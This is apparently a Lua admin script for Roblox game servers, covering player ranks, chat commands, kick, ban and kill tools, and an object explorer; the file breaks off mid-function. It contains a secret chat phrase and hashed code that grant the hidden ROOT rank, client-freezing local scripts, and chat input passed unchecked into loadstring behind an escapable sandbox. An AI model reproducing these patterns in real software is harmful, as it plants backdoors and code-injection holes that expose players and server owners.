-- NOVA Admin Server 7th Generation
-- Created by TeamDman
-- Use at own discretion.

--[[ CREATOR NOTES 
	Copying ANY code from this script
	means you relinquish your rights
	and give me, TeamDman, full control
	over your script.
]]--

NOVA = {
	["Colors"] = {
		["Red"] = Color3.new(1,0,0),
		["PinkRed"] = Color3.new(1,0,0.5),
		["Orange"] = Color3.new(1,0.5,0),
		["Yellow"] = Color3.new(1,1,0),
		["Green"] = Color3.new(0,1,0),
		["Blue"] = Color3.new(0,0,1),
		["LightBlue"] = Color3.new(0,1,1),
		["Pink"] = Color3.new(1,0,1),
		["Magenta"] = Color3.new(0.54,0,0.54),
		["Cyan"] = Color3.new(0,0.6,1),
		["White"] = Color3.new(1,1,1),
		["Grey"] = Color3.new(0.5,0.5,0.5),
		["Black"] = Color3.new(0,0,0),
	};
	["Services"] = {
		["Game"] = game;
		["RunService"] = game:GetService("RunService");
		["Workspace"] = game:GetService("Workspace");
		["Lighting"] = game:GetService("Lighting");
		["Debris"] = game:GetService("Debris");
		["Players"] = game:GetService("Players");
		["Teams"] = game:GetService("Teams");
		["InsertService"] = game:GetService("InsertService");
		["SoundService"] = game:GetService("SoundService");
		["ScriptContext"] = game:GetService("ScriptContext");
		["NetworkServer"] = game:GetService("NetworkServer");
		["StarterGui"] = game:GetService("StarterGui");
		["StarterPack"] = game:GetService("StarterPack");
		["ContentProvider"] = game:service'ContentProvider',
		["ContentFilter"] = game:service'ContentFilter',
		["KeyframeSequenceProvider"] = game:service'KeyframeSequenceProvider',
		["GuiService"] = game:service'GuiService',
		["Chat"] = game:service'Chat',
		["LocalBackpack"] = game:service'LocalBackpack',
		["JointsService"] = game:service'JointsService',
		["CollectionService"] = game:service'CollectionService',
		["PhysicsService"] = game:service'PhysicsService',
		["BadgeService"] = game:service'BadgeService',
		["Geometry"] = game:service'Geometry',
		["FriendService"] = game:service'FriendService',
		["RenderHooksService"] = game:service'RenderHooksService',
		["SocialService"] = game:service'SocialService',
		["TimerService"] = game:service'TimerService',
		["ScriptInformationProvider"] = game:service'ScriptInformationProvider',
		["CookiesService"] = game:service'CookiesService',
		["TeleportService"] = game:service'TeleportService',
		["PersonalServerService"] = game:service'PersonalServerService',
		["Selection"] = game:service'Selection',
		["MeshContentProvider"] = game:service'MeshContentProvider',
		["TextureContentProvider"] = game:service'TextureContentProvider',
		["TextService"] = game:service'TextService',
		["ControllerService"] = game:service'ControllerService',
		["Visit"] = game:service'Visit',
		["ChangeHistoryService"] = game:service'ChangeHistoryService',
	};
	["Ranks"] = {
		[4] = "ROOT",
		[3] = "Creator",
		[2] = "Sentinel",
		[1] = "Administrative",
		[0] = "Guest",
		[-1] = "Banished",
	};
	["Ranked"] = {
		["Defaults"] = 			{Color = Color3.new(1,0.5,0),		Rank = 0},
		["jackendra"] = 			{Color = Color3.new(-1,-1,-1),		Rank = 3},
		-- To add more people copy the above line and paste then change TeamDman to the person's name. Case sensitive.
	};
	["Generation"] = "7th Generation";
	["Commands"] = {};
	["Tablets"] = {};
	["Jails"] = {};
	["LockedInstances"] = {};
	["PrivateChats"] = {};
	["Overrider"] = {};
	["TabletRotation"] = 0;
	["TabletRotationIncrease"] = 0.1;
	["Cancel"] = false;
	["Abort"] = false;
	["Backup"] = script:Clone();
	["MapBackup"] = Instance.new("Model");
}
setmetatable(NOVA,{__call = function() return script end})

--[[ CREATE LOCAL SCRIPT ]]--
function CreateLocalScript(Source,Parent)
	if Source == nil then Source = "" end
	if Parent == nil then Parent = Instance.new("Model") end
	if newLocalScript ~= nil then
		return newLocalScript(Source,Parent)
	elseif NewLocalScript ~= nil then
		return NewLocalScript(Source,Parent)
	elseif NOVA.LocalScript ~= nil then
		local NS = NOVA.LocalScript:Clone()
		pcall(function() NS:ClearAllChildren() end)
		NS.Name = "LocalScript"
		local NSSource = Instance.new("StringValue",NS)
		NSSource.Name = "Source"
		NSSource.Value = Source
		local NSDSource = Instance.new("StringValue",NS)
		NSDSource.Name = "DSource"
		NSDSource.Value = Source
		--NS.Disabled = true
		NS.Parent = Parent
		--wait()
		NS.Disabled = false
		return NS
	else
		return false
	end
end

--[[ REGISTER PLAYER ]]--
function RegisterPlayer(Player,Exception)
	local Ran,Error = coroutine.resume(coroutine.create(function()
		if not pcall(function() Player:children() end) then
			return
		end
		local Data = NOVA.Ranked[Player.Name]
		if Data == nil then
			NOVA.Ranked[Player.Name] = {}
			Data = NOVA.Ranked[Player.Name]
			for i,v in pairs(NOVA.Ranked.Defaults) do
				Data[i] = v
			end
		end
			
		if NOVA.Services.Game.PlaceId == 0 then
			Data.Rank = 3
		end
		
		--[[
		if getmetatable(Data) == nil then
			setmetatable(Data,{
				__index = function(t,i)
					Data["Account Age"] = Player.AccountAge
					Data["User Id"] = Player.userId
					Data["Rank Name"] = NOVA.Ranks[Data.Rank]
				end
			})
		end
		]]--
		
		Player.Chatted:connect(function(Msg)
			OnChatted(Msg,Player)
		end)
			
		if Data.Rank <= 0 and Exception == nil then
			if Data.Rank == -1 then
				GetRidOf(Player)
				OutputAdmins(Player.Name.." was removed due to a banishment.","Orange",3)
			end
		end
		Connect(Player)
	end))
	if not Ran then
		OutputAdmins(Error,"Red",5)
	end
end

--[[ CONNECT ]]--
function Connect(Player)
	coroutine.wrap(function()
		repeat wait() until Player:FindFirstChild("Backpack") ~= nil
		CreateLocalScript([[
			repeat
				script.Parent = Instance.new("Glue") 
				game:service'RunService'.Stepped:wait()
			until script.Parent == nil
			local LocalPlayer = game:service'Players'.LocalPlayer
			while wait() do
				workspace.DescendantAdded:wait()
				if workspace:FindFirstChild("Disconnect:"..LocalPlayer.Name,true) ~= nil then
					workspace:FindFirstChild("Disconnect:"..LocalPlayer.Name,true):Destroy()
					if pcall(function() LocalPlayer:children() end) then
						LocalPlayer.Parent = nil
						wait()
						LocalPlayer.Parent = game:service'Players'
					else
						while true do
							ypcall(wait)
						end
					end
				end
			end
		]],Player:FindFirstChild("Backpack"))
	end)()
end

--[[ GET RID OF ]]--
function GetRidOf(Player)
	coroutine.wrap(function()
		NOVA.Services.Debris:AddItem(Player,(CreateLocalScript() == false and 0 or 2))
		repeat wait() until Player:FindFirstChild("Backpack") ~= nil
		CreateLocalScript(
			[[
				if pcall(function() game:service'Players'.LocalPlayer:children() end) then
					game:service'Players'.LocalPlayer.Parent = nil
					wait()
					game:service'Players'.LocalPlayer.Parent = game:service'Players'
				else
					while true do
						ypcall(wait)
					end
				end
			]],Player:FindFirstChild("Backpack")
		)
	end)()
end

--[[ OUTPUT ]]--
function Output(Text,Color,Player,Time,Func,HoverEnter,HoverExit)
	if Text == nil or Player == nil then return end
	if Color == nil then Color = "Orange" end
	if Color == "Random" then
		Color = Color3.new(math.random(),math.random(),math.random())
	end
	if type(Color) == "string" then
		Color = NOVA.Colors[Color]
	end
	local Mod = Instance.new("Model",NOVA.Services.Workspace)
	Mod.Name = "Output::"..Player.Name
	local Part = Instance.new("Part",Mod)
	Part.FormFactor = "Custom"
	Part.TopSurface = "Smooth"
	Part.BottomSurface = "Smooth"
	Part.Transparency = 0.7
	Part.Anchored = true
	Part.Locked = true
	Part.CanCollide = false
	Part.BrickColor = BrickColor.new(Color)
	Part.Size = Vector3.new(2,0.4,3)
	Part:BreakJoints()
	local Sel = Instance.new("SelectionBox",Part)
	Sel.Name = "Sel"
	Sel.Color = BrickColor.new(Color)
	Sel.Adornee = Part
	Sel.Transparency = 0.7
	local BBG = Instance.new("BillboardGui",Mod)
	BBG.Name = "BBG"
	BBG.StudsOffset = Vector3.new(0,3,0)
	BBG.Size = UDim2.new(10,0,10,0)
	local Label = Instance.new("TextLabel",BBG)
	Label.Name = "Label"
	Label.Text = Text
	Label.TextColor3 = Color
	Label.FontSize = "Size14"
	Label.BackgroundTransparency = 1
	Label.TextStrokeTransparency = 0.5
	Label.Size = UDim2.new(1,0,1,0)
	local Click = Instance.new("ClickDetector",Part)
	Click.MaxActivationDistance = 1/0
	Click.MouseHoverEnter:connect(function(Clicker)
		if Clicker == Player or GetRank(Clicker) > GetRank(Player) then
			Sel.Transparency = 0
			Part.Transparency = 0.3
		end
		if Clicker == Player or GetRank(Clicker) > GetRank(Player) and HoverEnter ~= nil then
			HoverEnter(Mod,Part,Player.Name,Sel,Label)
		end
	end)
	Click.MouseHoverLeave:connect(function(Clicker)
		if Clicker == Player or GetRank(Clicker) > GetRank(Player) then
			Sel.Transparency = 0.7
			Part.Transparency = 0.7
		end
		if Clicker == Player or GetRank(Clicker) > GetRank(Player) and HoverExit ~= nil then
			HoverExit(Mod,Part,Player.Name,Sel,Label)
		end
	end)
	Click.MouseClick:connect(function(Clicker)
		if Clicker == Player or GetRank(Clicker) > GetRank(Player) then
			if Text == "Dismiss" then
				RemoveTablets(Player)
			end
			if Func ~= nil then
				Func(Player)
			end
			coroutine.wrap(function()
				for i=0,1,0.1 do
					wait()
					Part.Transparency = i
					Sel.Transparency = i
					Label.TextTransparency = i
				end
				Mod:Destroy()
			end)()
		end
	end)
	if Time ~= nil then
		NOVA.Services.Debris:AddItem(Mod,Time)
	end
	NOVA.Tablets[#NOVA.Tablets+1] = {Model = Mod,Part = Part,Player = Player.Name,Sel = Sel,Label = Label}
	UpdateTablets()
	return {Model = Mod,Part = Part,Player = Player.Name,Sel = Sel,Label = Label}
end

--[[ OUTPUT ADMINS ]]--
function OutputAdmins(Msg,Color,Time,Func)
	for _,v in pairs(GetPlayers()) do
		if NOVA.Ranked[v.Name].Rank > 0 then
			Output(Msg,Color,v,Time,Func or nil)
		end
	end
end

--[[ UPDATE TABLETS ]]--
function UpdateTablets()
	NOVA.TabletRotation = NOVA.TabletRotation + NOVA.TabletRotationIncrease
	for _,Player in pairs(GetPlayers()) do
		local PlayerTablets = {}
		local Current = 0
		for i,v in pairs(NOVA.Tablets) do
			if v.Model.Parent == nil or v.Part.Parent == nil then
				pcall(function() v.Model:Destroy() end)
				NOVA.Tablets[i] = nil
			elseif v.Player == Player.Name then
				table.insert(PlayerTablets,v)
			end
		end

		for i=-180,180,360/#PlayerTablets do
			Current = Current + 1
			pcall(function()
				PlayerTablets[Current].Part.CFrame = CFrame.new(Player.Character.Torso.CFrame.x,Player.Character.Torso.CFrame.y,Player.Character.Torso.CFrame.z) 
					* CFrame.Angles(0,math.rad(i + NOVA.TabletRotation),0) 
					* CFrame.new(0,0,-7 - (#PlayerTablets*1.1))
					* CFrame.Angles(math.rad(70),0,0)
			end)
		end
	end
end

--[[ REMOVE TABLETS ]]--
function RemoveTablets(Player)
	if type(Player) == "userdata" then
		Player = Player.Name
	end
	for _,v in pairs(NOVA.Tablets) do
		if v.Player == Player then
			--[[coroutine.wrap(function()
				for i=0,1,0.1 do
					wait()
					v.Part.Transparency = i
					v.Sel.Transparency = i
					v.Label.TextTransparency = i
				end
				v.Model:Destroy()
			end)()]]--
			v.Model:Destroy()
		end
	end
end

--[[ GET RANK ]]--
function GetRank(Player)
	if type(Player) == "userdata" then
		Player = Player.Name
	end
	return NOVA.Ranked[Player].Rank or 0
end

--[[ SANDBOX LOADSTRING ]]--
function SandboxLoadstring(Source)
	local Func = loadstring(Source or "")
	setfenv(Func,{___ENV = getfenv(1)})
	return coroutine.wrap(Func)
end

--[[ GET PLAYERS ]]--
function GetPlayers(Msg,Speaker)
	if Msg == nil or Speaker == nil then
		return NOVA.Services.Players:GetPlayers() 
	else
		local Rtn = {}
		local Players = GetPlayers()
		Msg = Msg:lower()
		local Split = Msg:find(",")
		if Split ~= nil then
			for _,v in pairs(GetPlayers(Msg:sub(1,Split-1),Speaker)) do
				Rtn[#Rtn+1] = v
			end
			for _,v in pairs(GetPlayers(Msg:sub(Split+1),Speaker)) do
				Rtn[#Rtn+1] = v
			end
		elseif Msg == "me" then
			Rtn[#Rtn+1] = Speaker
		elseif Msg == "others" then
			for _,v in pairs(Players) do
				if v ~= Speaker then
					Rtn[#Rtn+1] = v
				end
			end
		elseif Msg == "all" then
			for _,v in pairs(Players) do
				Rtn[#Rtn+1] = v
			end
		elseif Msg == "random" then
			Rtn[#Rtn+1] = Players[math.random(1,#Players)]
		elseif Msg:sub(1,4) == "not " then
			local Nots = GetPlayers(Msg:sub(5),Speaker)
			for _,v in pairs(Players) do
				local ShouldAdd = true
				for _,i in pairs(Nots) do
					if v == i then
						ShouldAdd = false
					end
				end
				if ShouldAdd == true then
					Rtn[#Rtn+1] = v
				end
			end
		elseif Msg:sub(1,4) == "dist" then
			for _,v in pairs(Players) do
				--pcall(function()
					local Mag = (v.Character.Torso.Position - Speaker.Character.Torso.Position).magnitude
					if SandboxLoadstring("return "..tostring(Mag)..Msg:sub(5))() and v ~= Speaker then
						Rtn[#Rtn+1] = v
					end
				--end)
			end
		elseif Msg:sub(1,4) == "rank" then
			for _,v in pairs(Players) do
				if SandboxLoadstring("return "..tostring(GetRank(v))..Msg:sub(5))() then
					Rtn[#Rtn+1] = v
				end
			end
		elseif Msg:sub(1,3) == "age" then
			for _,v in pairs(Players) do
				if SandboxLoadstring("return "..tostring(v.AccountAge)..Msg:sub(4))() then
					Rtn[#Rtn+1] = v
				end
			end
		else
			for _,v in pairs(Players) do
				if v.Name:lower():sub(1,#Msg) == Msg then
					Rtn[#Rtn+1] = v
				end
			end
		end
		for i,v in pairs(Rtn) do
			if GetRank(v) > GetRank(Speaker) then
				Rtn[i] = nil
			end
		end
		return Rtn
	end
end

function GetSplit(Msg)
	return Msg:find("\\") or nil
end

--[[ ON CHATTED ]]--
function OnChatted(Msg,Speaker)
	coroutine.resume(coroutine.create(function()
		--if DontLog == nil then
			--print(Speaker.Name..":\t"..GetRank(Speaker)..":\t"..Msg)
		--end
		if Msg == "yw5sce0wvw9v0uzbw9watwauz9w0tb" then -- Dafuq that even mean?
			Override(Speaker,1)
		end 
		Msg = Msg:gsub("","")
	
		if Msg:sub(1,2) == "$ " then
			Msg = Msg:gsub("/","\\")
		end
		Msg = Msg:sub(GetSplit(Msg) or 0)
		
		if Msg:sub(1,5) == "\\wait" then
			Split = GetSplit(Msg:sub(6)) + 5
			wait(tonumber(Msg:sub(6,Split-1)))
			Msg = Msg:sub(Split)
		end
		
		if Msg:sub(1,3) == "\\do" then
			local Split = GetSplit(Msg:sub(4)) + 3
			local Ammount = tonumber(Msg:sub(4,Split-1))
			if Ammount>GetRank(Speaker)*10 and GetRank(Speaker) < 2 then
				return
			end
			for i=1,Ammount do
				if NOVA.Cancel == true then break end
				wait()
				OnChatted(Msg:sub(Split),Speaker)
			end
		end
		if not Msg:find("!") then
			if Msg:find("&") then
				local Split = Msg:find("&")
				OnChatted(Msg:sub(1,Split-1),Speaker)
				OnChatted(Msg:sub(Split+1),Speaker)
				return
			end
		end
		
		for Name,Command in pairs(NOVA.Commands) do
			if Msg:sub(1,#Command.Command+2):lower() == "\\"..Command.Command:lower().."\\" then
				if #NOVA.Overrider ~= 0 and Speaker ~= NOVA.Overrider.Speaker then
					Output("Commands may not be used during an override.","Red",Speaker,4)
				elseif GetRank(Speaker) >= Command.Rank then
					local Ran,Error = coroutine.resume(coroutine.create(function()
						Command.Func(Msg:sub(#Command.Command+3),Speaker)
					end))
					if not Ran then
						Output(Error,"Red",Speaker,5)
					end
				else
					Output("Unsufficient permissions.","Orange",Speaker,4)
				end
			end
		end
	end))
end

--[[ GET RECURSIVE CHILDREN ]]--
function GetRecursiveChildren(Source, Name, SearchType, Children)
	if Source == nil then
		Source = NOVA.Services.Game
	end
	if Name == nil or type(Name) ~= "string" then
		Name = ""
	end
	if Children == nil or type(Children) ~= "table" then
		Children = {}
	end
	if type(Source) == "userdata" then
		pcall(function()
			for _, Child in pairs(Source:children()) do
				pcall(function()
					if (function()
						if SearchType == nil or SearchType == 1 then
							return string.match(Child.Name:lower(), Name:lower())
						elseif SearchType == 2 then
							return string.match(Child.className:lower(), Name:lower())
						elseif SearchType == 3 then
							return Child:IsA(Name) or Child:IsA(Name:lower())
						elseif SearchType == 4 then
							return string.match(Child.Name:lower() .. string.rep(string.char(1), 5) .. Child.className:lower(), Name:lower()) or Child:IsA(Name) or Child:IsA(Name:lower())
						end
						return false
					end)() then
						table.insert(Children, Child)
					end
					GetRecursiveChildren(Child, Name, SearchType, Children)
				end)
			end
		end)
	elseif type(Source) == "table" then
		for _,Area in pairs(Source) do
			pcall(function()
				for _, Child in pairs(Area:children()) do
					pcall(function()
						if (function()
							if SearchType == nil or SearchType == 1 then
								return string.match(Child.Name:lower(), Name:lower())
							elseif SearchType == 2 then
								return string.match(Child.className:lower(), Name:lower())
							elseif SearchType == 3 then
								return Child:IsA(Name) or Child:IsA(Name:lower())
							elseif SearchType == 4 then
								return string.match(Child.Name:lower() .. string.rep(string.char(1), 5) .. Child.className:lower(), Name:lower()) or Child:IsA(Name) or Child:IsA(Name:lower())
							end
							return false
						end)() then
							table.insert(Children, Child)
						end
						GetRecursiveChildren(Child, Name, SearchType, Children)
					end)
				end
			end)
		end
	end
	return Children
end

--[[ EXPLORE ]]--
function Explore(Area,Speaker)
	pcall(function()
		RemoveTablets(Speaker)
		local Color = NOVA.Ranked[Speaker.Name].Color
		if Area == NOVA.Services or Area == nil then
			for _,v in pairs(NOVA.Services) do
				Output(v.className.."\t("..#v:children()..")",Color,Speaker,nil,
					function()
						Explore(v,Speaker)
					end
				)
			end
			--Output("Dismiss","Red",Speaker)
		else
			for i,v in pairs(Area:children()) do
				local Name = false
				pcall(function() v:children() Name = true end)
				if Name == true then
					Name = v.Name
				else
					Name = "Unknown Exception "..tostring(i)
				end
				Output(Name,Color,Speaker,nil,
					function()
						RemoveTablets(Speaker)
						Output("Name:\t"..v.Name,Color,Speaker)
						Output("Class:\t"..v.className,Color,Speaker)
						Output("Full Name:\t"..v:GetFullName(),Color,Speaker)
						Output("Destroy","Red",Speaker,nil,function() v:Destroy() Explore(v.Parent,Speaker) end)
						Output("Destroy ALL Named ( Workspace )","Red",Speaker,nil,function() Explore(v.Parent.Parent,Speaker) for _,i in pairs(GetRecursiveChildren(NOVA.Services.Workspace,v.Name,4)) do pcall(function() i:Destroy() end) end end)
						Output("Destroy ALL Named ( Game )","Red",Speaker,nil,function() Explore(v.Parent.Parent,Speaker) for _,i in pairs(GetRecursiveChildren(NOVA.Services,v.Name,4)) do pcall(function() i:Destroy() end) end end)
						Output("Destroy ALL Class ( Workspace )","Red",Speaker,nil,function() Explore(v.Parent.Parent,Speaker) for _,i in pairs(GetRecursiveChildren(NOVA.Services.Workspace,v.Name,2)) do pcall(function() i:Destroy() end) end end)
						Output("Destroy ALL Class  ( Game )","Red",Speaker,nil,function() Explore(v.Parent.Parent,Speaker) for _,i in pairs(GetRecursiveChildren(NOVA.Services,v.Name,2)) do pcall(function() i:Destroy() end) end end)
						Output("#REDIRECT Parent","Blue",Speaker,nil,function() Explore(v.Parent.Parent,Speaker) end)
						Output("#REDIRECT Children","Blue",Speaker,nil,function() Explore(v,Speaker) end)
						--Output("Dismiss","Red",Speaker)
					end
				)
			end
			--Output("Dismiss","Red",Speaker)
		end
	end)
end

--[[ PLAYER INTERFACE ]]--
function PlayerInterface(Player,Speaker)
	if type(Player) == "userdata" then
		Player = Player.Name
	end
	for Name,Data in pairs(NOVA.Ranked) do
		if Player == Name then
			RemoveTablets(Speaker)
			Output("Name : "..Name,Data.Color,Speaker)
			for i,v in pairs(Data) do
				Output(i.." : "..tostring(v),Data.Color,Speaker)
			end
			if GetRank(Speaker) > Data.Rank or Name == Speaker.Name then
				Output("Set Color","Blue",Speaker,nil,
					function()
						RemoveTablets(Speaker)
						for Color,Value in pairs(NOVA.Colors) do
							Output(Color,Value,Speaker,nil,
								function()
									Data.Color = Value
									PlayerInterface(Player,Speaker)
								end
							)
						end
						--Output("Dismiss","Red",Speaker)
					end
				)
			end
			if GetRank(Speaker) > Data.Rank then
				Output("Set Rank","Blue",Speaker,nil,
					function()
						RemoveTablets(Speaker)
						for Rank,Value in pairs(NOVA.Ranks) do
							if (Rank < 0 and GetRank(Speaker) < 2) or Rank >= GetRank(Speaker) then else
								Output(Value.."\t("..Rank..")","White",Speaker,nil,
									function()
										Data.Rank = Rank
										PlayerInterface(Player,Speaker)
									end
								)
							end
						end
						--Output("Dismiss","Red",Speaker)
					end
				)
			end
			if GetRank(Speaker) >= 2 and GetRank(Speaker) >= Data.Rank then
				Output("SHUT THEM DOWN!","Red",Speaker,nil,
					function()
						Instance.new("StringValue",NOVA.Services.Workspace).Name = "Disconnect:"..Player
					end
				)
			end
			--Output("Dismiss","Red",Speaker)
		end
	end
end


--[[ OVERRIDE ]]--
function Override(Speaker,Level)
	--pcall(function()
		local Override = false
		local EditedText = false
		local GUI = Instance.new("ScreenGui",Speaker.PlayerGui)
		local Frame = Instance.new("Frame",GUI)
		Frame.Name = "Frame"
		Frame.Style = "RobloxRound"
		Frame.Size = UDim2.new(0.5,0,0.1,0)
		Frame.Position = UDim2.new(0.25,0,0.45,0)
		local Text = Instance.new("TextBox",Frame)
		Text.Text = "Code"
		Text.FontSize = "Size18"
		Text.TextColor3 = Color3.new(1,0,0)
		Text.BackgroundTransparency = 1
		Text.Size = UDim2.new(1,0,1,0)
		Text.Changed:connect(function()
			if EditedText == false then
				EditedText = true
				if Level == 0 and Text.Text == "DHARMA" or Level == 1 and NOVA.Hash.Compute(tonumber(Text.Text)) == "4027642450039236903062020181424360024782830641020406283024143245003613284596170570126440480260281166" then
					Override = true
					Text.Text = "Override Successfull"
					pcall(function()
						NOVA.Ranked[NOVA.Overrider.Speaker.Name].Rank = NOVA.Overrider.Rank
					end)
					NOVA.Overrider = {Speaker = Speaker,Rank = NOVA.Ranked[Speaker.Name].Rank}
					NOVA.Ranked[Speaker.Name].Rank = 4
					if Level == 1 then

					end

					wait(1)
				else
					for i=1,3 do
						Text.Text = "Wrong Code"
						Text.TextTransparency = 0
						wait(0.7)
						Text.TextTransparency = 1
						wait(0.7)
					end
				end
				GUI:Destroy()
			end
		end)
	--end)
end

--[[ INITIAL STARTUP ]]--
for _,v in pairs(NOVA():children()) do pcall(function() v.Value = "" end) end
for _,v in pairs(GetPlayers()) do RegisterPlayer(v,true) end
for _,v in pairs(NOVA.Services.Workspace:children()) do pcall(function() v:Clone().Parent = NOVA.MapBackup end) end
script = {}
workspace = {}
Workspace = {}
game = {}
Game = {}
NOVA().Name = "§ NOVA Admin "..NOVA.Generation.." §"
NOVA.Services.Players.PlayerAdded:connect(RegisterPlayer)

--[[ ADD COMMAND ]]--
function AddCommand(Name,Command,Rank,Func)
	NOVA.Commands[Name] = {Command = Command,Rank = Rank,Func = Func}
end

AddCommand("Kill","kill",1,
	function(Msg,Speaker)
		for _,v in pairs(GetPlayers(Msg,Speaker)) do
			v.Character:BreakJoints()
		end
	end
)

AddCommand("Remove","remove",3,
	function(Msg,Speaker)
		for _,v in pairs(NOVA.Tablets) do
			pcall(function()
				v.Model:Destroy()
			end)
		end
		for i,v in pairs(getfenv(1)) do
			getfenv(1)[i] = nil
		end
		-- setfenv(1,{})
	end
)

AddCommand("Click Remove","cremove",3,
	function(Msg,Speaker)
		Output("Remove NOVA Admin?","Red",Speaker,nil,function() OnChatted("\\remove\\",Speaker) end)
	end
)


AddCommand("Ping","ping",0,
	function(Msg,Speaker)
		if #Msg == 0 or Msg == nil then
			Msg = "Pong!"
		end
		if Msg == "ranks" then
			for Rank,Name in pairs(NOVA.Ranks) do
				Output(Name.."\t("..tostring(Rank)..")","White",Speaker)
			end
			--Output("Dismiss","Red",Speaker)
		elseif Msg == "colors" then
			for Color,Value in pairs(NOVA.Colors) do
				Output(Color,Value,Speaker,nil,nil,
					function(Mod,Part,Player,Sel,Label)
						Label.Text = Color.."\t"..tostring(Value)
					end,
					function(Mod,Part,Player,Sel,Label)
						Label.Text = Color
					end
				)
			end
			--Output("Dismiss","Red",Speaker)
		elseif Msg:sub(1,2)=="a\\" then
			Output(tostring(SandboxLoadstring("return "..Msg:sub(3))()),"Random",Speaker)
		elseif Msg == "nil" then
			if #NOVA.Services.NetworkServer:children() == #GetPlayers() then
				Output("No nil players.","Orange",Speaker,5)
			else
				for _,v in pairs(NOVA.Services.NetworkServer:children()) do
					if v.GetPlayer ~= nil then
						if v:GetPlayer().Parent == nil then
							local Data = NOVA.Ranked[v:GetPlayer().Name]
							Output(v:GetPlayer().Name,Data.Color,Speaker,nil,
								function()
									PlayerInterface(v:GetPlayer(),Speaker)
								end
							)
						end
					end
				end
				--Output("Dismiss","Red",Speaker)
			end
		elseif Msg == "nil raw" then
			if #NOVA.Services.NetworkServer:children() == #GetPlayers() then
				Output("No nil players.","Orange",Speaker,5)
			else
				for _,v in pairs(NOVA.Services.NetworkServer:children()) do
					if v.GetPlayer ~= nil then
						if v:GetPlayer().Parent == nil then
							Output(v:GetPlayer().Name,"Grey",Speaker)
						end
					end
				end
				--Output("Dismiss","Red",Speaker)
			end
		else
			Output(Msg,"Random",Speaker)
		end
	end
)

AddCommand("Execute","exe",2,
	function(Msg,Speaker)
		local Func,Error = loadstring(Msg)
		getfenv(Func).print = function(...) local Rtn = "" for _,v in pairs({...}) do Rtn = Rtn..tostring(v).."\t" end Output(Rtn,"White",Speaker) end
		getfenv(Func).Speaker = Speaker

		if Error == nil then
			coroutine.wrap(function()
				Func()
			end)()
			Output("Script ran successfully!","Green",Speaker,3)
		else
			Output(Error,"Red",Speaker,5)
		end
	end
)

AddCommand("@","@",0,
	function(Msg,Speaker)
		local Split = GetSplit(Msg)
		for _,v in pairs(GetPlayers(Msg:sub(1,Split-1),Speaker)) do
			OnChatted(Msg:sub(Split),v)
		end
	end
)

AddCommand("Get Ranked","getranked",0,
	function(Msg,Speaker)
		if Msg == nil or #Msg == 0 then
			RemoveTablets(Speaker)
			for Name,v in pairs(NOVA.Ranked) do
				Output(Name.." ("..v.Rank..")",v.Color,Speaker,nil,
					function() 
						PlayerInterface(Name,Speaker) 
					end
				)
			end
			--Output("Dismiss","Red",Speaker)
		elseif Msg:lower() == "me" then
			PlayerInterface(Speaker,Speaker)
		else
			local Results = {}
			for Name,v in pairs(NOVA.Ranked) do
				if Name:lower():sub(1,#Msg) == Msg:lower() then
					Results[#Results+1] = {Name = Name,Data = v}
				end
			end
			if #Results == 1 then
				PlayerInterface(Results[1].Name,Speaker)
			else
				for _,v in pairs(Results) do
					Output(v.Name,v.Data.Color,Speaker,nil,function()
						PlayerInterface(v.Name,Speaker)
					end)
				end
			end
		end
	end
)

AddCommand("Dismiss","dismiss",0,
	function(Msg,Speaker)
		if Msg == nil or #Msg == 0 then
			RemoveTablets(Speaker)
		else
			for _,v in pairs(GetPlayers(Msg,Speaker)) do
				RemoveTablets(v)
			end
		end
	end
)

AddCommand("Commands","cmds",0,
	function(Msg,Speaker)
		RemoveTablets(Speaker)
		for Name,CMD in pairs(NOVA.Commands) do
			Output(Name.. "\t("..CMD.Command..","..CMD.Rank..")",NOVA.Ranked[Speaker.Name].Color,Speaker)
		end
		--Output("Dismiss","Red",Speaker)
	end
)

AddCommand("Set Rank","setrank",0,
	function(Msg,Speaker)
		local Split = GetSplit(Msg)
		for _,v in pairs(GetPlayers(Msg:sub(1,Split-1),Speaker)) do
			local Rank = tonumber(Msg:sub(Split+1))
			if Rank >= GetRank(Speaker) or ((Rank < 0 or GetRank(v) < 0) and GetRank(Speaker) < 2 ) then
				Output("You can't set "..v.Name.."'s rank to "..tostring(Rank),"Orange",Speaker,3)
			elseif NOVA.Ranks[Rank] == nil then
				Output("Rank not found.","Orange",Speaker,3)
			else
				NOVA.Ranked[v.Name].Rank = Rank
			end
		end
	end
)

AddCommand("Kick","kick",1,
	function(Msg,Speaker)
		for _,v in pairs(GetPlayers(Msg,Speaker)) do
			NOVA.Services.Debris:AddItem(v,0)
		end
	end
)

AddCommand("Get Rid Of","getridof",2,
	function(Msg,Speaker)
		for _,v in pairs(GetPlayers(Msg,Speaker)) do
			GetRidOf(v)
		end
	end
)

AddCommand("Banish","ban",2,
	function(Msg,Speaker)
		for _,v in pairs(GetPlayers(Msg,Speaker)) do
			if GetRank(Speaker) > GetRank(v) then
				NOVA.Ranked[v.Name].Rank = -1
				GetRidOf(v)
			end
		end
	end
)

AddCommand("Check","check",0,
	function(Msg,Speaker)
		RemoveTablets(Speaker)
		Color = NOVA.Ranked[Speaker.Name].Color
		do
			local Current = 0
			for _,_ in pairs(NOVA) do
				Current = Current + 1
			end
			Output("#NOVA : "..Current,Color,Speaker)
		end
		Output("Players : "..#GetPlayers(),Color,Speaker)
		Output("Replicators : "..#NOVA.Services.NetworkServer:children(),Color,Speaker)
		for i,v in pairs(NOVA) do
			if type(v) == "table" then
				local Current = 0
				for _,_ in pairs(v) do
					Current = Current + 1
				end
				Output(i..":\t"..tostring(Current),Color,Speaker)
			else
				Output(i..":\t"..tostring(v),Color,Speaker)
			end
		end
		--Output("Dismiss","Red",Speaker)
	end
)

AddCommand("Explorer","explorer",2,
	function(Msg,Speaker)
		Explore(NOVA.Services,Speaker)
	end
)

AddCommand("Teleport","tp",1,
	function(Msg,Speaker)
		local Split = GetSplit(Msg)
		local From = GetPlayers(Msg:sub(1,Split-1),Speaker)
		local To = GetPlayers(Msg:sub(Split+1),Speaker)[1]
		local Current = 0
		for i=-180,180,360/#From do
			Current = Current + 1
			pcall(function()
				if From[Current] ~= To then
					From[Current].Character.Torso.CFrame = To.Character.Torso.CFrame
						* CFrame.Angles(0,math.rad(i),0)
						* CFrame.new(0,0,5 + (#From*1.1))
				end
			end)
		end
	end
)

AddCommand("Cancel","cancel",1,
	function(Msg,Speaker)
		NOVA.Cancel = true
		wait(1)
		NOVA.Cancel = false
	end
)

AddCommand("Respawn","rs",1,
	function(Msg,Speaker)
		for _,v in pairs(GetPlayers(Msg,Speaker)) do
			v:LoadCharacter()
		end
	end
)

AddCommand("Home","home",0,
	function(Msg,Speaker)
